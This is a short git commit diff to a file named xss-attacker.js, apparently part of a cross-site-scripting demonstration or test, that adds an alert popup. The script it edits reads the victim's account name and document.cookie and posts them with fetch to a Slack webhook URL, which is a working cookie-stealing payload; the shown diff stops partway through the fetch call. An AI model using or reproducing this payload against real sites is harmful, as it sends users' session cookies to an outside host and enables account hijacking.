9c00cadda66f3b33dc31e5b4ef3e39034c770480
Jizu Sun <jizu.sun@sap.com>
2018-12-26 09:33:29 +0800

    add alert in xss

--- xss-attacker.js
+++ xss-attacker.js
@@ -1,9 +1,13 @@
+alert('xss injected!!');
+
 var text = `
     User: ${document.querySelector('#__jsview0--headItem-Account-name').innerHTML}
-    
+
     Cookie: ${document.cookie}
 `;
+
 var url = 'https://hooks.slack.com/services/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';
+
 fetch(url, {
     method: 'post',
     body: JSON.stringify({
